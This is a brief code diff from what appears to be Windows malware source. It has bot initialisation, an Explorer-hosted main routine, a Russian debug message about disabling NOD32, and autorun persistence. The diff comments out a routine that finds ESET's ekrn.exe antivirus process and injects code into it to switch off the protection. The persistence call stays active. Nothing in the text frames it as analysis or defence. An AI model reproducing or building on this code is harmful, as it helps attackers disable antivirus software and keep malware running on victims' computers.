@@ -199,6 +199,7 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	return 0;
 }
 
+/*
 static DWORD WINAPI NOD32Dll(void*)
 {
 	BOT::InitializeApi();
@@ -211,6 +212,7 @@ static DWORD WINAPI NOD32Dll(void*)
 	}
 	return 0;
 }
+*/
 
 void ExplorerMain()
 {
@@ -229,8 +231,8 @@ void ExplorerMain()
 
 	MDBG( "Main", "Отключаем NOD32" );
 //	OffNOD32();
-	DWORD dwPid = GetProcessIdByName("ekrn.exe");
-	InjectIntoProcess( dwPid, NOD32Dll );
+	//DWORD dwPid = GetProcessIdByName("ekrn.exe");
+	//InjectIntoProcess( dwPid, NOD32Dll );
 
 	InternalAddToAutorun();
 
